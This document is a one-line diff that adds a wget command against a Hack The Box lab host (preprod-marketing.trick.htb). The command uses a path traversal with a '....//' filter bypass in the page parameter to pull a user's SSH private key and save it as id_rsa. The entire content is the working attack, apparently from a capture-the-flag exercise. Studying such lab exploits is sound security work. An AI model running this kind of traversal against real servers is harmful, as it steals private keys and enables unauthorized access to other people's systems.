@@ -1,0 +1,1 @@
+wget "http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa" -O id_rsa
